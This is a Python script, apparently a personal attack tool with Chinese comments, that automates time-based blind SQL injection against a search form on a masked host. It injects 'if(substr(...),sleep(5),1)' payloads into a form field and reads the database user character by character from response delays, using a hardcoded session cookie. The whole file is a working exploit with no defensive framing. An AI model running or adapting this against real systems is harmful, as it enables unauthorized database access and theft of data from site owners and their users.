#! /usr/bin/env/python
# -*-coding:utf-8-*-
import requests
from bs4 import BeautifulSoup
import time

chars = r'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ@;\/:.'  # 正则

headers = {
    'Host': '******',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://******',
    'Connection': 'close',
    'Referer': 'http://******/?m=index',
    'Cookie': 'PHPSESSID=kjms59jjsmfi51kapfv4q2juv0',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=1'
}


# time blind sql injection
def time_blind(target):
    url = "http://******/?m=search&c=search"
    data = {
        'title': 'a',
        'url': 'a',
        'customer': '',
        'delay': '',
        'os': 'a',
        'port': 'a',
        'middleware': 'a',
        'cms': 'a',
        'language': "a%' and if(substr({},{})='{}',sleep(5), 1)#"
    }
    count = 1
    result = ''
    while (True):
        result_tmp = result
        for char in chars:
            start = time.time()
            # data['language']=data['language'].format(target,count,char)
            data['language'] = f"a%' and if(substr({target},{count},1)='{char}',sleep(5),1)#"
            # data['language'] = f"a%' and if(left(user(),1)='r', sleep(5), 1)#"
            #a%' and if(left(user(),1)='r', sleep(5), 1)#
            print('trying....{}'.format(char))
            print(data['language'])
            response = requests.post(url,data=data,headers=headers)
            if time.time() - start >= 5:
                result += char
                print(result + '......')
                break
        # 判断是否结束
        if result_tmp == result:  # 最后一次遍历所有结果返回值均为小于5s，故result没有变，可作为出头条件
            print(u'脚本结束(结果不区分大小写)')
            print(result)
            break
        count = count + 1


if __name__ == '__main__':
    time_blind('user()')#时间盲注